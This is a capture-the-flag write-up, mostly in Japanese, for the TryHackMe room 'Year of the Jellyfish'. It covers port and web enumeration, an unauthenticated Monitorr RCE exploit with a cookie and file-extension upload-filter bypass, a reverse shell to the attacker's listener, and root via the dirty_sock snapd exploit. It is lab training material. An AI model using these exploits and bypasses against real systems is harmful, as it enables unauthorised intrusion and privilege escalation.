# Year of the Jellyfish CTF

https://tryhackme.com/room/yearofthejellyfish

## Enumeration

```shell
TARGET=10.49.116.216
sudo bash -c "echo $TARGET   jelly.thm  robyns-petshop.thm monitor.robyns-petshop.thm beta.robyns-petshop.thm dev.robyns-petshop.thm >> /etc/hosts"
```

### ポートスキャン

```sh
nmap -v -p- -Pn --min-rate 10000 $TARGET

PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
443/tcp   open  https
8000/tcp  open  http-alt
8096/tcp  open  unknown
22222/tcp open  easyengine
```

```sh
$ nmap -v -p21,22,80,443,8000,8096,22222 -sV -Pn --min-rate 10000 $TARGET 

PORT      STATE SERVICE  VERSION
21/tcp    open  ftp      vsftpd 3.0.3
22/tcp    open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http     Apache httpd 2.4.29
443/tcp   open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
8000/tcp  open  http-alt
8096/tcp  open  http     Microsoft Kestrel httpd
22222/tcp open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
```

HTTP(S)が複数、FTP。また、SSHが2つ。

```sh
$ nikto -p 80 -T 1 2 3 -h $TARGET
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.48.81.240
+ Target Hostname:    10.48.81.240
+ Target Port:        80
+ Start Time:         2026-02-02 13:59:55 (GMT9)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the sitssing-content-type-header/
+ Root page / redirects to: https://robyns-petshop.thm/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
```

`robyns-petshop.thm` ホストを追加

### FTP

anonymousログインは失敗。

### 80 Robyns Petshop

証明書から

`robyn@robyns-petshop.thm`

```
DNS Name: robyns-petshop.thm
DNS Name: monitorr.robyns-petshop.thm
DNS Name: beta.robyns-petshop.thm
DNS Name: dev.robyns-petshop.thm
```

betaは8000ポートと同じような表示。monitor,devはノーマルと変わらない。

```sh
$ dirsearch -u https://robyns-petshop.thm     

[14:10:26] 200 -  111B  - /.gitignore                                       
[14:10:47] 301 -  327B  - /assets  ->  https://robyns-petshop.thm/assets/   
[14:10:47] 200 -  448B  - /assets/
[14:10:52] 401 -  466B  - /business                                         
[14:10:53] 200 -   28KB - /CHANGELOG.md                                     
[14:10:54] 200 -    1KB - /composer.json                                    
[14:10:55] 301 -  327B  - /config  ->  https://robyns-petshop.thm/config/   
[14:10:55] 200 -   20KB - /composer.lock
[14:10:55] 200 -  460B  - /config/                                          
[14:10:56] 301 -  328B  - /content  ->  https://robyns-petshop.thm/content/ 
[14:10:56] 200 -  484B  - /content/                                         
[14:10:56] 200 -   17KB - /CONTRIBUTING.md                                  
[14:11:08] 200 -    1KB - /LICENSE                                          
[14:11:19] 301 -  328B  - /plugins  ->  https://robyns-petshop.thm/plugins/ 
[14:11:19] 200 -  457B  - /plugins/                                         
[14:11:21] 200 -   18KB - /README.md                                        
[14:11:31] 301 -  327B  - /themes  ->  https://robyns-petshop.thm/themes/   
[14:11:31] 200 -  451B  - /themes/                                          
[14:11:34] 200 -  566B  - /vendor/                                          
[14:11:34] 200 -    0B  - /vendor/autoload.php                              
[14:11:34] 200 -    0B  - /vendor/composer/autoload_classmap.php
[14:11:34] 200 -    0B  - /vendor/composer/autoload_files.php
[14:11:34] 200 -    0B  - /vendor/composer/autoload_namespaces.php
[14:11:34] 200 -    0B  - /vendor/composer/autoload_real.php
[14:11:34] 200 -    0B  - /vendor/composer/autoload_psr4.php
[14:11:34] 200 -    0B  - /vendor/composer/autoload_static.php
[14:11:34] 200 -    0B  - /vendor/composer/ClassLoader.php
[14:11:34] 200 -    1KB - /vendor/composer/LICENSE
[14:11:34] 200 -   18KB - /vendor/composer/installed.json
```

Changelog

```sh
Pico Changelog
...

### Version 2.1.4
Released: 2020-08-29
* [Changed] Silence PHP errors in Parsedown
* [Fixed] #560: Improve charset guessing for formatted date strings using
          `strftime()` (Pico always uses UTF-8, but `strftime()` might not)
```

https://github.com/picocms/Pico の、version2.1.4 が稼働していると思われる。最新バージョン。Issueを見る限り、セキュリティ的な脆弱性はない。

/business にアクセスするとBASIC認証が表示される。数分ブルートフォースしたが空振り。

### 8000

開発中。軽くファジングしたが何も見つからなかった。

```txt
If you have been given a specific ID to use when accessing this development site, please put it at the end of the url (e.g. robyns-petshop.thm:8000/ID_HERE)
```

### 8096

`Jellyfin` のログイン画面。フリーソフトのメディアシステム。https://jellyfin.org/

パスワードリセットはネットワーク内から実行する必要がある。X-Forwarded-For, Refferer, Origin を変えてみたが偽装は失敗。

```
Please try again within your home network to initiate the password reset process.
```

https://github.com/jellyfin/jellyfin/security/advisories/GHSA-866x-wj5j-2vf4 の認証不要の脆弱性があるが、UIDの推測が必要であるため現実的ではない。

## 再び80ポート

サブドメインが monitor ではなく、monitorr だった。新しい画面が表示された。`Monitorr | 1.7.6m`

このバージョンのエクスプロイトがある。認証不要RCE。

```sh
$ searchsploit Monitorr
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
Monitorr 1.7.6m - Authorization Bypass                                           | php/webapps/48981.py
Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)                        | php/webapps/48980.py
--------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

実行したら、エクスプロイトを検出されてアップロード成功しなかった。  
WAFの回避が必要。

```sh
$ python3 ./48980.py https://monitorr.robyns-petshop.thm/ 192.168.129.39 8888

...
<div id='uploadreturn'>You are an exploit.</div><div id='uploaderror'>ERROR: she_ll.php was not uploaded.</div></div>
...
```

分からないのでウォークスルーをチラ見した。

devtool で見ると、Cookie に `isHuman=1` という値が設定されている。

- isHuman=1 Cookie を追加する
- ファイル名の拡張子を gif.pHp とする

ことでアップロード成功した。宛先ポートもFWで制限されていたので443にした。

```sh
$ sudo nc -nlvp 443
[sudo] password for kali: 
listening on [any] 443 ...
connect to [192.168.129.39] from (UNKNOWN) [10.49.116.216] 32956
bash: cannot set terminal process group (933): Inappropriate ioctl for device
bash: no job control in this shell
www-data@petshop:/var/www/monitorr/assets/data/usrimg$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 権限昇格１

datausers.db を（Base64エンコードして）ダウンロード

```sh
www-data@petshop:/var/www/monitorr$ ls -al
ls -al
...
-rw-r--r--  1 www-data www-data  8192 Apr 11  2021 datausers.db
...
```

adminユーザーのパスワードハッシュが含まれていたが、bcryptなのでブルートフォースが厳しい。

```sh
$2y$10$q1BI3CSqToALH2Q1r2weLeRpyU[REDACTED]
```

フラグ１を発見。

```sh
www-data@petshop:/var/www$ s -al
ls -al
total 24
drwxr-xr-x  5 root     root     4096 Apr 30  2021 .
drwxr-xr-x 14 root     root     4096 Apr  9  2021 ..
drwxr-xr-x  9 root     root     4096 Apr 11  2021 dev
-r--------  1 www-data www-data   38 Apr 30  2021 flag1.txt
drwxr-xr-x  9 root     root     4096 Apr 11  2021 html
drwxr-xr-x  4 www-data www-data 4096 Apr 11  2021 monitorr
```

dev, html の内容に差分は無かった。

```sh
www-data@petshop:/var/www$ diff -rq ./dev ./html
```

jellyfin 関係のシェルスクリプト

```sh
www-data@petshop:/var/www$ cat /usr/lib/jellyfin/restart.sh
#!/bin/bash

# restart.sh - Jellyfin server restart script
# Part of the Jellyfin project (https://github.com/jellyfin)
#
# This script restarts the Jellyfin daemon on Linux when using
# the Restart button on the admin dashboard. It supports the
# systemctl, service, and traditional /etc/init.d (sysv) restart
# methods, chosen automatically by which one is found first (in
# that order).
#
# This script is used by the Debian/Ubuntu/Fedora/CentOS packages.

get_service_command() {
    for command in systemctl service; do
        if which $command &>/dev/null; then
            echo $command && return
        fi
    done
    echo "sysv"
}

cmd="$( get_service_command )"
echo "Detected service control platform '$cmd'; using it to restart Jellyfin..."
case $cmd in
    'systemctl')
        echo "sleep 0.5; /usr/bin/sudo $( which systemctl ) start jellyfin" | at now 
        ;;
    'service')
        echo "sleep 0.5; /usr/bin/sudo $( which service ) jellyfin start" | at now 
        ;;
    'sysv')
        echo "sleep 0.5; /usr/bin/sudo /etc/init.d/jellyfin start" | at now 
        ;;
esac
exit 0
```

### linpeas

ssh-honeypot と at の脆弱性(CVE-2002-1614)が気になった。

```sh
╔══════════╣ Analyzing Github Files (limit 70)

drwxr-xr-x 8 root root 4096 Apr 11  2021 /opt/ssh-honeypot/.git

╔══════════╣ SGID
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                                                                                           
-rwxr-sr-x 1 root shadow 34K Jul 22  2020 /sbin/unix_chkpwd                                                                                                                                                                               
-rwxr-sr-x 1 root shadow 34K Jul 22  2020 /sbin/pam_extrausers_chkpwd
-rwsr-sr-x 1 root root 99K Apr 16  2018 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwxr-sr-x 1 root utmp 10K Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwxr-sr-x 1 root tty 14K Jan 17  2018 /usr/bin/bsd-write
-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
```

CVE はコンパイルできたが機能しなかった。

honeypot

```sh
www-data@petshop:/opt/ssh-honeypot$ ls -al
total 76
drwxr-xr-x 7 root root 4096 Apr 11  2021 .
drwxr-xr-x 4 root root 4096 Apr 16  2021 ..
drwxr-xr-x 8 root root 4096 Apr 11  2021 .git
-rw-r--r-- 1 root root   69 Apr 11  2021 .gitignore
-rw-r--r-- 1 root root  190 Apr 11  2021 CHANGELOG.md
-rw-r--r-- 1 root root  255 Apr 11  2021 INSTALL.md
-rw-r--r-- 1 root root 1081 Apr 11  2021 LICENSE.md
-rw-r--r-- 1 root root  625 Apr 11  2021 Makefile
-rw-r--r-- 1 root root  312 Apr 11  2021 MakefileOSX
-rw-r--r-- 1 root root 2074 Apr 11  2021 README.md
-rw-r--r-- 1 root root   49 Apr 11  2021 TODO.md
drwxr-xr-x 2 root root 4096 Apr 11  2021 bin
drwxr-xr-x 3 root root 4096 Apr 11  2021 docker
drwxr-xr-x 2 root root 4096 Apr 11  2021 scripts
drwxr-xr-x 2 root root 4096 Apr 11  2021 src
-rw-r--r-- 1 root root   95 Apr 11  2021 ssh-honeypot.log
-rw------- 1 root root 1675 Apr 11  2021 ssh-honeypot.rsa
-rw-r--r-- 1 root root  394 Apr 11  2021 ssh-honeypot.rsa.pub
-rw-r--r-- 1 root root  357 Apr 11  2021 ssh-honeypot.service

www-data@petshop:/opt/ssh-honeypot$ git diff ssh-honeypot.service
diff --git a/ssh-honeypot.service b/ssh-honeypot.service
index e8eca2e..699407f 100644
--- a/ssh-honeypot.service
+++ b/ssh-honeypot.service
@@ -5,7 +5,7 @@ Wants=network-online.target
 
 [Service]
 Type=forking
-ExecStart=/usr/local/bin/ssh-honeypot -p 22 -r /etc/ssh-honeypot/ssh-honeypot.rsa -u nobody -l /var/log/ssh-honeypot.log -f /var/run/ssh-honeypot.pid -d
+ExecStart=/opt/ssh-honeypot/bin/ssh-honeypot -p 22 -r /opt/ssh-honeypot/ssh-honeypot.rsa -u nobody -l /var/log/ssh-honeypot.log -f /var/run/ssh-honeypot.pid -d
 
 [Install]
 WantedBy=multi-user.target
```

22ポートのSSHはハニーポットで、22222が本物のSSHだった。

この先も分からなかったのでウォークスルーを見た。

### dirty_sock

dirty_sockが正解らしい。注目していなかったが、linpeasにも出ていた。

```sh
[+] [CVE-2019-7304] dirty_sock

   Details: https://initblog.com/2019/dirty-sock/
   Exposure: less probable
   Tags: ubuntu=18.10,mint=19
   Download URL: https://github.com/initstring/dirty_sock/archive/master.zip
   Comments: Distros use own versioning scheme. Manual verification needed.
```

https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py を保存して実行。

```sh
www-data@petshop:/tmp$ python3 ./dirty.py

      ___  _ ____ ___ _   _     ____ ____ ____ _  _ 
      |  \ | |__/  |   \_/      [__  |  | |    |_/  
      |__/ | |  \  |    |   ___ ___] |__| |___ | \_ 
                       (version 2)

//=========[]==========================================\\
|| R&D     || initstring (@init_string)                ||
|| Source  || https://github.com/initstring/dirty_sock ||
|| Details || https://initblog.com/2019/dirty-sock     ||
\\=========[]==========================================//


[+] Slipped dirty sock on random socket file: /tmp/gtovmzujdl;uid=0;
[+] Binding to socket file...
[+] Connecting to snapd API...
[+] Deleting trojan snap (and sleeping 5 seconds)...
[+] Installing the trojan snap (and sleeping 8 seconds)...
[+] Deleting trojan snap (and sleeping 5 seconds)...



********************
Success! You can now `su` to the following account and use sudo:
   username: dirty_sock
   password: dirty_sock
********************
```

```sh
$ ssh dirty_sock@10.48.122.22 -p 22222
The authenticity of host '[10.48.122.22]:22222 ([10.48.122.22]:22222)' can't be established.
ED25519 key fingerprint is SHA256:gtp2HBdGAoTcjb5nva4eIgc8vv36K0q2DgLxs0m2XMU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.48.122.22]:22222' (ED25519) to the list of known hosts.
dirty_sock@10.48.122.22's password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

dirty_sock@petshop:~$ id
uid=1001(dirty_sock) gid=1001(dirty_sock) groups=1001(dirty_sock),27(sudo)
```

```sh
dirty_sock@petshop:~$ sudo bash -p
root@petshop:~# id
uid=0(root) gid=0(root) groups=0(root)
```

## 振り返り

- サブドメインが monitor ではなく monitorr であることに気付かずかなり時間を無駄にした。コピペするべきだった。
- WAFバイパスは難しかった。`You are an exploit.` というメッセージを見た時点で、WAFバイパスが示唆されていると気づくべきだった。
- linpeas の出力からどうすれば dirty_sock が有効と見抜けたかと考えたが、無理という結論。ただ、マニュアル列挙を尽くしたあと、ウォークスルーを見る前にCVEリストに当たる必要があると感じた。

## Tags

#tags:monitorr #tags:dirty_sock #tags:アップロードフィルターバイパス
